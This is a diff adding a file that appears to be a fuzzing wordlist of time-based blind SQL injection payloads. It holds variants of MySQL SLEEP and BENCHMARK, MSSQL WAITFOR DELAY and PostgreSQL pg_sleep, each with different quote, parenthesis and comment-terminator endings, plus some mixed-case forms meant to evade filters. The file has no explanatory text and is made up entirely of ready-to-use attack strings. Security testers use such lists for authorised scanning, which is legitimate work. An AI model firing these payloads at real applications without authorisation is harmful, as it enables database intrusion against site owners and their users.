@@ -1,0 +1,82 @@
+sleep(6)#
+1 or sleep(6)#
+" or sleep(6)#
+' or sleep(6)#
+" or sleep(6)="
+' or sleep(6)='
+1) or sleep(6)#
+") or sleep(6)="
+') or sleep(6)='
+1)) or sleep(6)#
+")) or sleep(6)="
+')) or sleep(6)='
+;waitfor delay '0:0:6'--
+);waitfor delay '0:0:6'--
+';waitfor delay '0:0:6'--
+";waitfor delay '0:0:6'--
+');waitfor delay '0:0:6'--
+");waitfor delay '0:0:6'--
+));waitfor delay '0:0:6'--
+'));waitfor delay '0:0:6'--
+"));waitfor delay '0:0:6'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(6)--
+1 or pg_sleep(6)--
+" or pg_sleep(6)--
+' or pg_sleep(6)--
+1) or pg_sleep(6)--
+") or pg_sleep(6)--
+') or pg_sleep(6)--
+1)) or pg_sleep(6)--
+")) or pg_sleep(6)--
+')) or pg_sleep(6)--
+AND (SELECT * FROM (SELECT(SLEEP(6)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(6)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(6)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(6)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(6)))nQIP)#
+SLEEP(6)#
+SLEEP(6)--
+SLEEP(6)="
+SLEEP(6)='
+or SLEEP(6)
+or SLEEP(6)#
+or SLEEP(6)--
+or SLEEP(6)="
+or SLEEP(6)='
+waitfor delay '00:00:06'
+waitfor delay '00:00:06'--
+waitfor delay '00:00:06'#
+benchmark(60000000,MD5(1))
+benchmark(60000000,MD5(1))--
+benchmark(60000000,MD5(1))#
+or benchmark(60000000,MD5(1))
+or benchmark(60000000,MD5(1))--
+or benchmark(60000000,MD5(1))#
+pg_SLEEP(6)
+pg_SLEEP(6)--
+pg_SLEEP(6)#
+or pg_SLEEP(6)
+or pg_SLEEP(6)--
+or pg_SLEEP(6)#
+'\"
+AnD SLEEP(6)
+AnD SLEEP(6)--
+AnD SLEEP(6)#
+&&SLEEP(6)
+&&SLEEP(6)--
+&&SLEEP(6)#
+' AnD SLEEP(6) ANd '1
+'&&SLEEP(6)&&'1
+ORDER BY SLEEP(6)
+ORDER BY SLEEP(6)--
+ORDER BY SLEEP(6)#
